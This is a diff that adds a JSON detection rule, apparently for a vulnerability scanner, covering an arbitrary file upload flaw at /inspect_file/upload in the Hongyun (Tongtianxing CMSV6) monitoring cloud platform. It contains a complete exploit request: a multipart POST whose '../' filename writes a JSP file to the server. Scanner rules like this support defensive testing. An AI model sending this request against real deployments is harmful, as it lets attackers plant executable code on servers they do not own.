@@ -1,0 +1,24 @@
+{
+    "vul_name": "鸿运(通天星CMSV6车载)主动安全监控云平台inspect_file/upload存在任意文件上传漏洞",
+    "level": "高危",
+    "description": "鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件上传漏洞。",
+    "product": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "version": "鸿运(通天星CMSV6车载)主动安全监控云平台",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/picVQ5hgrqCvO0pnJLC-5g",
+    "fixing": "",
+    "rule": {
+        "path": "/inspect_file/upload",
+        "method": "POST",
+        "headers": "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Length: 226\nContent-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b",
+        "body": "--2e7688d712bcc913201f327059f9976b\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"../707140.jsp\"\nContent-Type: application/octet-stream\n\n<% out.println(\"007319607\"); %>\n--2e7688d712bcc913201f327059f9976b--",
+        "status_code": "200",
+        "keywords": "jsp",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
